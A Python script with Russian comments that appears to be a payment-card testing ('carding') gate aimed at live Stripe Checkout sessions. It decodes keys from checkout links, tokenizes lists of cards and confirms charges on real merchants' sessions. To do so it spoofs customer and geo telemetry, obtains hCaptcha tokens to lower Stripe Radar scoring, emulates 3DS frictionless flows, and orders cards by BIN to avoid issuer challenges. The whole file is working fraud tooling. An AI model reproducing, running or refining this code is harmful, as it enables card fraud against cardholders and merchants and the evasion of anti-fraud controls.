# language: Python 3.12+, file: hit_gate.py, target: Windows 11, deps: curl_cffi
# Stripe Checkout /hit — проверка карты по ГОТОВОМУ cs_live-линку (hosted checkout).
# Вектор из разведки research/chat-corpus/ (docs/ИССЛЕДОВАНИЕ-НОВЫЕ-ПОВЕРХНОСТИ.md §В1):
#   cs_live-URL -> fid-фрагмент (XOR5+base64+JSON, stripe_fid.py) -> pk + session
#   -> GET /v1/payment_pages/{cs} (PI+amount+init_checksum)
#   -> POST /v1/payment_methods (токенизация)
#   -> POST /v1/payment_pages/{cs}/confirm -> вердикт эмитента
# Отличие от confirm_gate: НЕ нужен сайт-донор с pk на витрине —
# подходит любой checkout-линк (checkout.stripe.com / pay.1vpn.org / pay.opus.pro / buy.stripe.com).
import asyncio
import sys
import time
import uuid
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession

import config
import gate_client as gc
import stripe_fid
import bin_steering
import frictionless_engine
import pusto_logger as _log

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


def _amount_mismatch(status_code: int, err: dict) -> bool:
    """checkout_amount_mismatch живёт в error.code, error.decline_code ИЛИ в хвосте
    error.message (живой кейс 06.09.2026: code=None, message='...subscription.
    checkout_amount_mismatch' — каскад фикса №6 его не видел и падал в DECLINED)."""
    if status_code not in (400, 402, 409):
        return False
    src = " ".join(str(err.get(k) or "") for k in ("decline_code", "code", "message"))
    return "amount_mismatch" in src


class CsHitSession:
    """Одна cs_live-сессия:fid -> pk -> PI; несколько карт, пока PI жив."""

    def __init__(self, target_url: str, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS, proxy: str | None = None):
        self.url = target_url.strip()
        self.max_amount = max_amount_cents
        self.proxy = proxy
        self.s: AsyncSession | None = None
        self.pk = ""
        self.cs = ""
        self.pi_id = ""
        self.secret = ""
        self.amount = 0
        self.currency = ""
        self.checksum = ""
        self.confirms = 0
        self.customer_email = ""
        self.customer_name = ""
        self.customer_country = ""
        self.steering = bin_steering.BinSteeringEngine()
        self.hcaptcha_token: str | None = None
        self.use_ctoken: bool = False

    async def open(self) -> tuple[bool, str]:
        d = stripe_fid.decode_fragment(self.url)
        self.pk = str(d.get("apiKey") or "")
        self.cs = str(d.get("checkoutSessionId") or "")
        if not self.pk.startswith("pk_live") or not self.cs.startswith("cs_"):
            return False, "не удалось извлечь pk/cs из fid-фрагмента (линк мёртв?)"
        s = AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=self.proxy)
        try:
            r = await s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                            params={"key": self.pk},
                            headers={"Origin": "https://js.stripe.com",
                                     "Referer": "https://js.stripe.com/",
                                     "Accept": "application/json"}, timeout=12)
            if r.status_code != 200:
                await s.close()
                return False, f"payment_pages HTTP {r.status_code}: {r.text[:120]}"
            data = r.json()
            if data.get("is_sandbox_merchant") or not data.get("livemode", True):
                await s.close()
                return False, "TEST_MODE (sandbox-мерчант)"
            
            # Проверяем статус сессии: если она уже завершена (complete/expired) — выходим
            sess_status = data.get("status")
            if sess_status in ("complete", "expired"):
                await s.close()
                return False, f"сессия чекаута уже {sess_status}"

            pi = data.get("payment_intent") or {}
            self.secret = str(pi.get("client_secret") or "")
            self.pi_id = str(pi.get("id") or "")
            self.amount = int(pi.get("amount") or 0)
            self.currency = str(pi.get("currency") or "").upper()
            self.checksum = str(data.get("init_checksum") or "")

            cust = data.get("customer") or {}
            self.customer_email = str(data.get("customer_email") or cust.get("email") or "")
            self.customer_name = str(cust.get("name") or "")
            self.customer_country = str((cust.get("address") or {}).get("country") or (data.get("tax_context") or {}).get("customer_tax_country") or "")

            status = pi.get("status")
            # Разрешаем requires_payment_method И requires_action (Stripe позволяет перезаписывать незавершенный 3DS новой картой)
            if status and status not in ("requires_payment_method", "requires_action"):
                await s.close()
                return False, f"PI status={status} — сессия не переиспользуется"

            if not self.secret and status:
                # В подписочных сессиях client_secret может отсутствовать до confirm
                pass

            if not status or self.amount == 0:
                # подписочные сессии: PI создаётся только при confirm или сумма в total_summary/invoice
                due = ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due"))
                if not due and not self.amount:
                    await s.close()
                    return False, "PI скрыт и сумма неизвестна (нестандартная сессия)"
                if due:
                    self.amount = int(due)
                self.currency = str(data.get("currency") or (data.get("invoice") or {}).get("currency") or "").upper() or "USD"

            if self.amount > self.max_amount:
                await s.close()
                return False, f"CHARGE_RISK: {self.amount}{self.currency} > {self.max_amount}c"
            self.s = s
            return True, ""
        except Exception as e:
            await s.close()
            return False, f"{type(e).__name__}: {e}"

    async def _alive(self) -> bool:
        """Проверяем, жива ли сессия (requires_payment_method / requires_action или session open)."""
        try:
            r = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                                 params={"key": self.pk},
                                 headers={"Origin": "https://js.stripe.com",
                                          "Referer": "https://js.stripe.com/",
                                          "Accept": "application/json"}, timeout=12)
            data = r.json() or {}
            if data.get("status") in ("complete", "expired"):
                return False
            pi = data.get("payment_intent") or {}
            st = pi.get("status")
            if st:
                return st in ("requires_payment_method", "requires_action")
            return data.get("status") == "open"
        except Exception:
            return False

    async def check_card(self, card_raw: str, bin_alpha2: str = "") -> dict:
        if self.s is None:
            return {"status": "ERROR", "detail": "сессия не открыта"}
        if not await self._alive():
            return {"status": "SESSION_EXPIRED", "detail": "Checkout session expired or completed on Stripe"}
        if self.confirms >= config.MAX_CONFIRMS_PER_SECRET:
            return {"status": "ERROR", "detail": "confirm-бюджет исчерпан"}

        # 1. 3DS Steering & Geo Enrichment
        profile = await self.steering.evaluate_card(card_raw)
        effective_a2 = bin_alpha2 or profile.country_a2 or self.customer_country

        telem = gc.stripe_telemetry(self.url, self.pk)
        if self.customer_email:
            telem["email"] = self.customer_email
        if self.customer_name:
            telem["name"] = self.customer_name
        if effective_a2:
            telem.update(gc.geo_identity_fields(effective_a2))
        card = gc.parse_card(card_raw)
        try:
            r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
                                      data=gc.tokenize_body(card, telem, self.url),
                                      headers=gc.TOKENIZE_HEADERS, timeout=10)
            td = r_tok.json()
            _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
        except Exception as e:
            return {"status": "ERROR", "detail": f"tokenize: {type(e).__name__}: {e}"[:150]}
        if "id" not in td:
            err = td.get("error", {})
            _log.log_stripe("TOKENIZE_FAIL", gc.mask_pan(card_raw), str(err.get("code", "error"))[:40], str(err.get("message", ""))[:60])
            return {"status": gc.classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                    "detail": err.get("message", str(td))[:200],
                    "steering_category": profile.category.value,
                    "confidence": profile.confidence_score}
        _log.log_stripe("TOKENIZE_OK", td["id"], detail=gc.mask_pan(card_raw))
        # Превентивное снижение скоринга Stripe Radar: запрашиваем P1_-токен в живой сессии
        if isinstance(self.s, AsyncSession) and not self.hcaptcha_token:
            try:
                donor_host = urlparse(self.url).netloc or "checkout.stripe.com"
                self.hcaptcha_token = await gc.fetch_hcaptcha_radar_token(self.s, self.pk, donor_host)
            except Exception:
                self.hcaptcha_token = None

        body = {
            "key": self.pk,
            "eid": str(uuid.uuid4()),
            "payment_method": td["id"],
            "expected_payment_method_type": "card",
            "expected_amount": str(self.amount),
            "return_url": self.url.split("#")[0],
        }
        if self.hcaptcha_token:
            body["radar_options[hcaptcha_token]"] = self.hcaptcha_token
        if self.use_ctoken:
            try:
                ct_res = await gc.create_confirmation_token(self.s, self.pk, td["id"], return_url=self.url.split("#")[0])
                if ct_res.get("id"):
                    body["confirmation_token"] = ct_res["id"]
                    body.pop("payment_method", None)
            except Exception:
                pass
        if self.checksum:
            body["init_checksum"] = self.checksum
        # подписочные сессии пересчитывают инвойс между open и confirm —
        # при checkout_amount_mismatch перечитываем сумму и повторяем один раз
        try:
            r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  data=body,
                                  headers={"Origin": "https://js.stripe.com",
                                           "Referer": "https://js.stripe.com/",
                                           "Accept": "application/json"}, timeout=20)
            resp = r.json()
            _log.log_http("POST", f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", r.status_code)
        except Exception as e:
            return {"status": "ERROR", "detail": f"confirm: {type(e).__name__}: {e}"[:150]}
        self.confirms += 1
        err = resp.get("error") or {}
        if _amount_mismatch(getattr(r, "status_code", 0), err):
            try:
                rg = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                                      params={"key": self.pk},
                                      headers={"Origin": "https://js.stripe.com",
                                               "Referer": "https://js.stripe.com/",
                                               "Accept": "application/json"}, timeout=12)
                data0 = rg.json() or {}
                pi0 = data0.get("payment_intent") or {}
                new_amt = pi0.get("amount") or ((data0.get("total_summary") or {}).get("due")) or ((data0.get("invoice") or {}).get("amount_due"))
                if new_amt and int(new_amt) != self.amount:
                    self.amount = int(new_amt)
                    self.currency = str(pi0.get("currency") or data0.get("currency") or self.currency).upper()
                    body["expected_amount"] = str(self.amount)
                    body["eid"] = str(uuid.uuid4())
                    body["payment_method"] = td["id"]
                    r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                          data=body,
                                          headers={"Origin": "https://js.stripe.com",
                                                   "Referer": "https://js.stripe.com/",
                                                   "Accept": "application/json"}, timeout=20)
                    resp = r.json()
                    self.confirms += 1
            except Exception:
                pass
            # mismatch повторился и после пересчёта — подписочный прейлист дрейфует
            # быстрее, чем мы подтверждаем. Это свойство цели, не карты: честный
            # ERROR (возврат кредита), а не DECLINED эмитентом.
            err2 = resp.get("error") or {}
            if _amount_mismatch(getattr(r, "status_code", 0), err2):
                _log.log_stripe("AMOUNT_DRIFT", self.cs[:14], "mismatch x2", "invoice proration unstable")
                return {"status": "ERROR",
                        "detail": ("подписочный инвойс дрейфует: amount_mismatch повторился "
                                   f"после пересчёта ({self.amount}{self.currency}) — цель "
                                   "нестабильна, карта эмитентом не проверялась"),
                        "amount_cents": self.amount, "currency": self.currency,
                        "steering_category": profile.category.value,
                        "confidence": profile.confidence_score,
                        "reason": profile.reason}
        verdict, detail = await self._classify_and_resolve_3ds(resp, profile)
        return {"status": verdict, "detail": detail[:250],
                "amount_cents": self.amount, "currency": self.currency,
                "steering_category": profile.category.value,
                "confidence": profile.confidence_score,
                "reason": profile.reason}

    async def _classify_and_resolve_3ds(self, resp: dict, profile: bin_steering.CardProfile | None = None) -> tuple[str, str]:
        """Вердикт по ответу payment_pages/confirm с проходом 3DS-ветки:
        1. Ошибки карточного уровня (402, decline) -> классификация через gate_client
        2. Успех (complete / paid / succeeded) -> APPROVED@PAID
        3. requires_action -> исполнение 3DS-Method + frictionless_engine -> 3DS_FRICTIONLESS / 3DS_CHALLENGE."""
        err = resp.get("error") or {}
        if err:
            code = (str(err.get("code") or "") + " " + str(err.get("decline_code") or "")).strip()
            msg = str(err.get("message") or "")
            return gc.classify_pi_verdict({"error": {**err, "message": f"{msg} {code}".strip()}})
        if resp.get("status") in ("complete",) or resp.get("payment_status") == "paid":
            return "APPROVED@PAID", f"checkout complete ({self.amount}{self.currency})"
        pi = resp.get("payment_intent") or {}
        pi_st = str(pi.get("status") or "")
        lpe = pi.get("last_payment_error") or {}
        if pi_st == "succeeded":
            return "APPROVED@PAID", f"PI succeeded ({self.amount}{self.currency})"
        if pi_st == "processing":
            return "PI_PENDING", "PI processing"
        if lpe:
            code = (str(lpe.get("code") or "") + " " + str(lpe.get("decline_code") or "")).strip()
            return gc.classify_pi_verdict({"error": {**lpe, "message": str(lpe.get("message") or "") + " " + code}})
        
        if pi_st == "requires_action":
            na = pi.get("next_action") or {}
            na_type = na.get("type") or ""
            
            # --- 3DS2 flow (use_stripe_sdk) ---
            if na_type == "use_stripe_sdk":
                sdk = na.get("use_stripe_sdk") or {}
                sdk_type = sdk.get("type") or ""
                stripe_js = sdk.get("stripe_js") or {}
                
                # Если уже пришёл прямой challenge от ACS (creq / acs_url) -> 3DS_CHALLENGE
                if sdk_type == "stripe_3ds2_challenge" or "acs_url" in stripe_js:
                    return "3DS_CHALLENGE", "3DS2 challenge required (OTP/SMS)"

                # Stripe Radar bot challenge (hCaptcha Enterprise): НЕ 3DS и не
                # свойство карты — антифрод Stripe до аутентификации эмитентом.
                # Возводим ДО fingerprint-попытки: у этого sdk нет
                # three_ds_method_url и source, frictionless-движок тут делает
                # только пустые запросы. CAPTCHA_CHECKOUT в coerce-списке:
                # кредит возвращается, фолл-троу к следующему гейту срабатывает.
                if sdk_type == "intent_confirmation_challenge":
                    sk = str(sdk.get("site_key") or stripe_js.get("site_key") or "")
                    sk_note = f"sitekey={sk[:8]}… " if sk else ""
                    _log.log_stripe("RADAR_CHALLENGE", self.cs[:14], "hCaptcha", sk_note.strip())
                    return "CAPTCHA_CHECKOUT", (f"Stripe Radar bot challenge (hCaptcha, {sk_note}"
                                                f"rqdata attached) — антифрод цели, не 3DS; карта не проверялась эмитентом")

                # Исполняем Frictionless Engine (3DS-Method iframe emulation + aligned browser telemetry)
                if self.s is not None:
                    target_cc = (profile.country_a2 if profile else "") or self.customer_country or "US"
                    f_res = await frictionless_engine.attempt_frictionless_resolution(
                        self.s, self.pk, self.cs, sdk, country_code=target_cc
                    )
                    outcome = f_res.get("outcome")
                    if outcome == "FRICTIONLESS_PASSED":
                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "PASSED", f"{self.amount}{self.currency}")
                        return "APPROVED@PAID", f"3DS2 frictionless passed ({self.amount}{self.currency})"
                    elif outcome == "CHALLENGE_REQUIRED":
                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "CHALLENGE", "issuer requires OTP")
                        return "3DS_CHALLENGE", "3DS2 challenge (transStatus=C, enrolled)"
                
                # Fallback по типу SDK
                if sdk_type == "stripe_3ds2_fingerprint":
                    return "3DS_CHALLENGE", f"3DS2 enrolled ({sdk_type})"
                return "3DS_REQUIRED", f"3DS SDK action (type={sdk_type or na_type})"
            
            # --- 3DS1 / Redirect flow (redirect_to_url) ---
            if na_type == "redirect_to_url":
                red_url = na.get("redirect_to_url", {}).get("url", "")
                return "3DS_CHALLENGE", f"3DS redirect challenge: {red_url[:80]}"
            
            return "3DS_REQUIRED", f"3DS action required (type={na_type})"
            
        return gc.classify_pi_verdict(resp)

    async def close(self):
        if self.s is not None:
            try:
                await self.s.close()
            except Exception:
                pass
            self.s = None


async def qualify_session(target_url: str, proxy: str | None = None, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS) -> dict:
    """Пре-флайт квалификатор сессии /hit (payment_pages) без отправки карты:
    Проверяет:
    - валидность URL и извлечение pk/cs через fid-фрагмент
    - статус сессии (open, complete, expired)
    - режим мерчанта (live vs sandbox)
    - состояние PaymentIntent (requires_payment_method, requires_action, succeeded)
    - сумму и валюту (в пределах капа или CHARGE_RISK)
    - 3DS-политику мерчанта (request_three_d_secure: automatic vs any)
    - тип сессии (разовый payment vs подписка subscription)
    - Radar-риски и рекомендации.
    """
    d = stripe_fid.decode_fragment(target_url)
    pk = str(d.get("apiKey") or "")
    cs = str(d.get("checkoutSessionId") or "")
    if not pk.startswith("pk_live") or not cs.startswith("cs_"):
        return {
            "viable": False,
            "status": "INVALID_URL",
            "recommendation": "FAIL: Не удалось декодировать pk/cs из fid-фрагмента (линк невалиден)",
            "details": {}
        }

    imp = config.pick_impersonate()
    norm_proxy = gc.normalize_proxy(proxy) if proxy else None
    try:
        async with AsyncSession(impersonate=imp, verify=False, proxy=norm_proxy) as s:
            r = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
                            params={"key": pk},
                            headers={"Origin": "https://js.stripe.com",
                                     "Referer": "https://js.stripe.com/",
                                     "Accept": "application/json"}, timeout=12)
            if r.status_code != 200:
                return {
                    "viable": False,
                    "status": f"HTTP_{r.status_code}",
                    "recommendation": f"FAIL: payment_pages вернул статус {r.status_code}",
                    "details": {"error_body": r.text[:200]}
                }
            data = r.json() or {}
            sess_status = data.get("status")
            livemode = data.get("livemode", True)
            is_sandbox = data.get("is_sandbox_merchant", False)

            if not livemode or is_sandbox:
                return {
                    "viable": False,
                    "status": "TEST_MODE",
                    "recommendation": "SKIP: Мерчант в sandbox-режиме, реальные списания отключены",
                    "details": {"livemode": livemode, "is_sandbox": is_sandbox}
                }

            if sess_status in ("complete", "expired"):
                return {
                    "viable": False,
                    "status": str(sess_status).upper(),
                    "recommendation": f"FAIL: Сессия уже {sess_status} (завершена или просрочена)",
                    "details": {"session_status": sess_status}
                }

            pi = data.get("payment_intent") or {}
            pi_status = pi.get("status") or "hidden_subscription"
            amount = int(pi.get("amount") or ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due")) or 0)
            currency = str(pi.get("currency") or data.get("currency") or "").upper() or "USD"
            mode = str(data.get("mode") or ("subscription" if data.get("invoice") or data.get("subscription") else "payment"))

            pm_opts = pi.get("payment_method_options") or {}
            card_opts = pm_opts.get("card") or {}
            three_ds_req = card_opts.get("request_three_d_secure", "automatic")

            is_over_cap = amount > max_amount_cents if amount > 0 else False
            viable = (sess_status == "open") and (pi_status in ("requires_payment_method", "requires_action", "hidden_subscription")) and not is_over_cap

            if not viable and is_over_cap:
                rec = f"SKIP: Сумма {amount}{currency} выше допустимого лимита {max_amount_cents}c (CHARGE_RISK)"
            elif three_ds_req in ("any", "challenge_only"):
                rec = "WARN: Мерчант требует 3DS OTP на каждую транзакцию (enforced SCA)"
            elif viable:
                rec = f"READY_FOR_HIT: Доступно прямое списание ({mode}, {amount}{currency}, 3DS={three_ds_req})"
            else:
                rec = f"WARN: Нестандартный статус PaymentIntent: {pi_status}"

            return {
                "viable": viable,
                "status": sess_status,
                "pi_status": pi_status,
                "mode": mode,
                "amount_cents": amount,
                "currency": currency,
                "three_ds_policy": three_ds_req,
                "is_over_cap": is_over_cap,
                "customer_country": str((data.get("customer") or {}).get("address", {}).get("country") or (data.get("tax_context") or {}).get("customer_tax_country") or ""),
                "recommendation": rec,
                "details": {
                    "pk": pk[:14] + "...",
                    "cs": cs[:14] + "...",
                    "init_checksum": bool(data.get("init_checksum")),
                }
            }
    except Exception as e:
        return {
            "viable": False,
            "status": "EXCEPTION",
            "recommendation": f"FAIL: Исключение при анализе сессии: {type(e).__name__}: {e}",
            "details": {"error": str(e)}
        }


async def main():
    args = sys.argv[1:]
    proxy = None
    while "--proxy" in args:
        i = args.index("--proxy")
        if i + 1 < len(args):
            proxy = args[i + 1]
            del args[i:i + 2]
        else:
            del args[i]
    if not args:
        p_hit = os.path.join(os.path.dirname(__file__), "data", "hit_targets.txt")
        if os.path.exists(p_hit):
            with open(p_hit, encoding="utf-8") as f:
                for line in f:
                    if line.strip().startswith("http"):
                        args.append(line.strip())
                        break
        if not args:
            print("Usage: python hit_gate.py <cs_live-checkout-url> [cards...|file] [--proxy URL]")
            return
        print(f"[*] Цель не указана — взята из data/hit_targets.txt: {args[0][:60]}...")
    target = args[0]
    cards = []
    import os
    for a in args[1:]:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        else:
            cards.append(a.strip())
    if not cards:
        probe = gc.gen_probe_card()
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] карт нет — probe: {cards[0]}")
    print("=" * 80)
    print("[*] STRIPE CHECKOUT /hit GATE (cs_live hosted checkout)")
    print(f"[*] Target: {target.split('#')[0]}")
    print(f"[*] Cards: {len(cards)} | Proxy: {proxy or 'direct'}")
    
    # Предварительная оценка и приоритизация пула карт через BinSteeringEngine
    engine = bin_steering.BinSteeringEngine()
    queue = await engine.split_queue(cards)
    _log.log_hit(f"BIN STEERING queue: {len(queue[bin_steering.ThreeDsCategory.DIRECT_CHECKOUT])} DIRECT_PASS | "
                 f"{len(queue[bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE])} FRICTIONLESS | "
                 f"{len(queue[bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY])} CHALLENGE | "
                 f"{len(queue[bin_steering.ThreeDsCategory.INVALID])} INVALID")
    print("=" * 80)

    # Приоритетный порядок: DIRECT_CHECKOUT -> FRICTIONLESS -> CHALLENGE
    ordered_cards = []
    for cat in (bin_steering.ThreeDsCategory.DIRECT_CHECKOUT,
                bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE,
                bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY,
                bin_steering.ThreeDsCategory.INVALID):
        for p in queue[cat]:
            for orig in cards:
                if gc.extract_pan(orig) == p.pan and orig not in ordered_cards:
                    ordered_cards.append(orig)
                    break
    cards = ordered_cards

    norm_proxy = gc.normalize_proxy(proxy) if proxy else None
    gs = CsHitSession(target, proxy=norm_proxy)
    ok, detail = await gs.open()
    if not ok:
        print(f"[x] open failed: {detail}")
        return
    print(f"[+] session: {gs.pi_id} {gs.amount}{gs.currency} (confirms: {gs.confirms}/{config.MAX_CONFIRMS_PER_SECRET})")
    try:
        for i, c in enumerate(cards):
            t0 = time.perf_counter()
            res = await gs.check_card(c)
            lat = int((time.perf_counter() - t0) * 1000)
            st = str(res.get("status", "?"))
            steer_tag = f"[{res.get('steering_category', '?')[:6]}]"
            print(f">>> [{st:18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:100]}", flush=True)
            _log.log_verdict("hit", gc.mask_pan(c), st,
                             detail=str(res.get("detail", ""))[:60], latency_ms=lat)
            if st in ("SESSION_EXPIRED", "SESSION_CANCELED"):
                print(f"[!] Сессия закрыта со стороны Stripe ({st}). Дальнейшие карты не проверяются, остановка очереди.")
                _log.log_hit(f"Session terminated by Stripe: {st}. Remaining cards aborted.")
                break
            if i < len(cards) - 1:
                await asyncio.sleep(1.5)
    finally:
        await gs.close()


if __name__ == "__main__":
    asyncio.run(main())